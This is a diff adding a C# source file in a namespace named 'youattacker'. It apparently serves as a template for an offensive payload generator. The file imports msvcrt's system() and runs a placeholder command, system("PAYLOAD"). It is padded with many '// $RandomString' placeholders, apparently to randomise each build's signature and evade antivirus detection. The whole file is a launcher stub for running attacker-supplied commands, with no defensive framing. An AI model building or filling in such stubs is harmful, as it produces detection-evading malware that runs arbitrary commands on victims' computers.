@@ -1,0 +1,211 @@
+using System.Runtime.InteropServices;
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+namespace youattacker
+// $RandomString
+{
+	public class CMD
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	{
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+		[DllImport("msvcrt.dll")]
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		public static extern int system(string cmd);
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		public static void Main()
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+        // $RandomString
+		{
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+			system("PAYLOAD");
+			// $RandomString
+			// $RandomString
+			// $RandomString
+			// $RandomString
+			// $RandomString
+		}
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+		// $RandomString
+	}
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+	// $RandomString
+}
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
+// $RandomString
